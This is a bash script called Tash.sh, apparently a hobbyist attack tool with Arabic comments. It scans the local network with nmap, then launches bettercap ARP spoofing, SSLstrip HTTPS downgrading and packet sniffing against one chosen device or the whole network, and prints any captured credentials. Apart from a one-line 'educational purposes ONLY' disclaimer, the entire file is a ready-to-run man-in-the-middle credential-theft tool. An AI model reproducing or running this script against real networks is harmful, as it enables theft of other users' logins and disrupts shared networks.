#!/bin/bash

# Tash.sh v2.1 - The Intelligent Recon Update
# Powered by bettercap engine. For educational purposes ONLY.

# --- الألوان والبانر ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

function print_banner() {
    echo -e "${RED}"
    echo "      ████████╗ █████╗ ███████╗██╗  ██╗   ${YELLOW}v2.1${RED}"
    echo "      ╚══██╔══╝██╔══██╗██╔════╝██║  ██║"
    echo "         ██║   ███████║███████╗███████║"
    echo "         ██║   ██╔══██║╚════██║██╔══██║"
    echo "         ██║   ██║  ██║███████║██║  ██║"
    echo "         ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${YELLOW}"
    echo "    >> The tool was made from my heart by Taha sh <<"
    echo -e "${NC}"
    echo "--------------------------------------------------"
}

# --- التحقق من الأدوات المطلوبة ---
function check_dependencies() {
    # ... (نفس الكود السابق، لا تغيير)
    echo -e "${BLUE}[*] Checking for required tools...${NC}"
    if ! command -v bettercap &> /dev/null; then
        echo -e "${RED}[!] ERROR: 'bettercap' is not installed. Please install it first.${NC}"
        echo -e "${YELLOW}On Debian/Ubuntu: sudo apt-get install bettercap${NC}"
        exit 1
    fi
    if ! command -v nmap &> /dev/null; then
        echo -e "${RED}[!] ERROR: 'nmap' is not installed. Please install it first.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] All tools are present.${NC}"
}

# --- الخيار 1: فحص الشبكة (النسخة الجديدة والمحسنة) ---
function scan_network_v2() {
    echo -e "\n${BLUE}[*] Identifying your local network...${NC}"
    # طريقة أكثر ذكاءً لتحديد الشبكة، تتجاهل الواجهات الافتراضية والمحلية
    NETWORK_RANGE=$(ip -o -4 route show to default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/')
    
    if [ -z "$NETWORK_RANGE" ]; then
        echo -e "${RED}[!] Could not automatically determine your network range.${NC}"
        echo -n -e "${YELLOW}Please enter it manually (e.g., 192.168.1.0/24): ${NC}"
        read NETWORK_RANGE
    fi

    echo -e "${BLUE}[*] Starting a detailed scan on network: ${NETWORK_RANGE}${NC}"
    echo -e "${YELLOW}This may take a few minutes...${NC}"
    
    # استخدام Nmap مع خيارات متقدمة لكشف نظام التشغيل والخدمات
    # -O: لكشف نظام التشغيل (يتطلب صلاحيات root)
    # -sV: لكشف إصدارات الخدمات
    nmap -O -sV $NETWORK_RANGE | awk '
    /Nmap scan report for/ {ip=$5; if (ip ~ /\(/) {ip=substr($6, 1, length($6)-1)} printf "\n----------------------------------------\n" ; printf "IP Address: \033[0;32m%s\033[0m\n", ip} 
    /MAC Address:/ {printf "MAC Address: %s (%s)\n", $3, substr($0, index($0,$4))}
    /Running:/ {printf "OS Guess: \033[0;33m%s\033[0m\n", $2}
    /OS details:/ {printf "OS Details: %s\n", substr($0, index($0,$3))}
    /PORT/ {p=1; print "Open Ports:"} 
    /^[0-9]+\/tcp/ {if(p) printf "  - %-10s %-7s %s\n", $1, $2, substr($0, index($0,$3))}'
    
    echo -e "\n\n${GREEN}[+] Detailed scan complete.${NC}"
}


# --- الخيار 2 و 3: تنفيذ الهجوم (لا تغيير هنا) ---
function launch_attack() {
    # ... (نفس الكود السابق، لا تغيير)
    TARGET_IP=$1
    INTERFACE=$(ip -o -4 addr show | awk '{print $2}' | head -n 1)

    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[!] Could not determine the network interface. Exiting.${NC}"
        exit 1
    fi

    echo -e "\n${BLUE}[*] Using network interface: ${INTERFACE}${NC}"
    if [ "$TARGET_IP" == "all" ]; then
        echo -e "${RED}[!] LAUNCHING NETWORK-WIDE ATTACK!${NC}"
        TARGET_CONFIG="set arp.spoof.targets ;"
    else
        echo -e "${BLUE}[*] Target IP selected: ${TARGET_IP}${NC}"
        TARGET_CONFIG="set arp.spoof.targets ${TARGET_IP};"
    fi

    echo -e "${YELLOW}[*] Preparing bettercap attack script...${NC}"
    
    ATTACK_SCRIPT="
    net.probe on;
    ${TARGET_CONFIG}
    set arp.spoof.fullduplex true;
    arp.spoof on;
    set https.proxy.sslstrip true;
    https.proxy on;
    net.sniff on;
    "

    echo -e "${RED}[*] LAUNCHING ATTACK! Captured credentials will be displayed below.${NC}"
    echo -e "${RED}[*] Press CTRL+C to stop the attack.${NC}"
    echo "--------------------------------------------------"
    
    sudo bettercap -iface $INTERFACE -eval "${ATTACK_SCRIPT}"
}

# --- وظيفة التنظيف ---
function cleanup() {
    # ... (نفس الكود السابق، لا تغيير)
    echo -e "\n\n${BLUE}[*] Attack stopped. Exiting Tash.${NC}"
    exit 0
}

# --- القائمة الرئيسية (مع استدعاء الوظيفة الجديدة) ---
trap cleanup INT

if [ "$EUID" -ne 0 ]; then 
  echo -e "${RED}[!] This script must be run as root. Please use 'sudo'.${NC}"
  exit 1
fi

check_dependencies
print_banner

echo -e "${GREEN}Please choose an option:${NC}"
echo "1) Scan the network and list all devices (Detailed)"
echo "2) Attack a specific target"
echo "3) Attack ALL devices on the network (Extreme Caution!)"
echo "q) Quit"
echo -n "Enter your choice [1-3, q]: "
read choice

case $choice in
    1)
        scan_network_v2 # <-- هنا التغيير
        ;;
    2)
        scan_network_v2 # <-- هنا التغيير
        echo -n -e "\n${YELLOW}Enter the IP address of the target you want to attack: ${NC}"
        read target_ip
        launch_attack $target_ip
        ;;
    3)
        read -p "ARE YOU SURE you want to attack the entire network? This can cause major disruptions. (y/n): " confirm
        if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
            launch_attack "all"
        else
            echo "Aborting."
        fi
        ;;
    q)
        exit 0
        ;;
    *)
        echo -e "${RED}Invalid option. Exiting.${NC}"
        ;;
esac
